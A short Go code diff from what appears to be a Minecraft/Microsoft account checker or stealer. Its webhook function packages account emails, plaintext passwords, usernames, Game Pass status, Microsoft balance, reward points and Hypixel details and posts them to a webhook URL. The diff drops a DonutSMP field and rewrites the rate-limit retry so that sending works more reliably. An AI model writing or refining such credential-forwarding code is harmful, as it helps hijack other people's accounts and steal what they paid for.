@@ -54,7 +54,7 @@ func buildWebhookEmbed(title, description string, color int) WebhookEmbed {
 }
 
 func buildAccountWebhookEmbed(email, password, username, uuid,
-	gamepass, msBalance, rewardPoints, hypixelInfo, donutInfo string) WebhookEmbed {
+	gamepass, msBalance, rewardPoints, hypixelInfo string) WebhookEmbed {
 
 	var fields []WebhookField
 
@@ -80,10 +80,6 @@ func buildAccountWebhookEmbed(email, password, username, uuid,
 
 	if hypixelInfo != "" {
 		fields = append(fields, WebhookField{Name: "Hypixel", Value: hypixelInfo, Inline: false})
-	}
-
-	if donutInfo != "" {
-		fields = append(fields, WebhookField{Name: "DonutSMP", Value: donutInfo, Inline: false})
 	}
 
 	color := 0x5865F2
@@ -140,6 +136,9 @@ func sendWebhook(webhookURL string, embed WebhookEmbed) {
 
 	if resp.StatusCode == 429 {
 		time.Sleep(2 * time.Second)
-		client.Do(req)
+		retryReq, _ := http.NewRequest("POST", webhookURL, bytes.NewReader(data))
+		retryReq.Header.Set("Content-Type", "application/json")
+		retryReq.Header.Set("User-Agent", UserAgent)
+		client.Do(retryReq)
 	}
 }
